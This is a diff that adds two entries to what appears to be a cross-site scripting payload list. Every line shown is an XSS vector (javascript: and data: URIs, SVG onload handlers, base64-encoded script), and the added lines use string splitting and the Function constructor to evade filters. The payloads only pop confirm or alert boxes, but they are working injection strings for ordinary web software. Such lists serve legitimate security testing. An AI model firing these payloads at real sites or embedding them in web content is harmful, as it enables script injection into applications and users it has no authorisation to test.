@@ -27,7 +27,9 @@ javascript://%0Aconfirm(1)
 <sVg/oNloAd="JaVaScRiPt:/**\/*\'/"\eval(atob('Y29uZmlybSgxKTs='))">
 data:text/html,<script>confirm(0)</script>
 data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+
+document.writeln("a".link("javas\cript:al"%2b"ert`1`")); :))
 <script src="data:;base64,YWxlcnQoMSk="></script>
+[][`filter`][`constructor`](`ale`.concat(`rt\x28`.concat`1\x29`))();//
 <something:script xmlns:something="http://www.w3.org/1999/xhtml">confirm(1)</something:script>
 <svg xmlns="http://www.w3.org/2000/svg" onload="confirm(1)"/>
 <\/style><svg/onload=confirm(1)>
